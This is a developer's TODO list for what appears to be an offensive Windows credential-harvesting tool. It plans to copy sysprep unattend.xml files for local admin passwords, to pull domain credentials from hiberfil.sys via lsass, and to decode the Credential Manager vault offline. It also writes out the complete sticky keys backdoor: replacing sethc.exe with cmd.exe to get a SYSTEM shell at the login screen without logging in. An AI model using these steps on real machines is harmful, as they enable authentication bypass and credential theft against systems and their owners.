	TODO
	----
	- Add function to search and copy sysprep config files - unattend.xml 
		these files could contain local admin creds
	- Add function to copy hiberfil.sys from Win OS root
		this file could be several gigs, copy will take a while..
		could allow us to pull domain creds from lsass

			^ UNABLE TO RECREATE (tested on Win7 box with no updates....)
				Win10 added additional huffman encoding to the hiberfil.sys
				hiber2dmp does not support			
	- Investigate Windows Credential Manager Vault and pulling/decoding from offline OS
		Would allow for access to application creds (IE, wifi?, etc.) 
	- Add sickey keys hack
		move c:\windows\system32\sethc.exe   c:\windows\system32\sethc.exe.bak
		copy c:\windows\system32\cmd.exe    c:\windows\system32\sethc.exe 
		reboot, hit shift x5 on login screen, get cmd running as SYSTEM without logging in :)
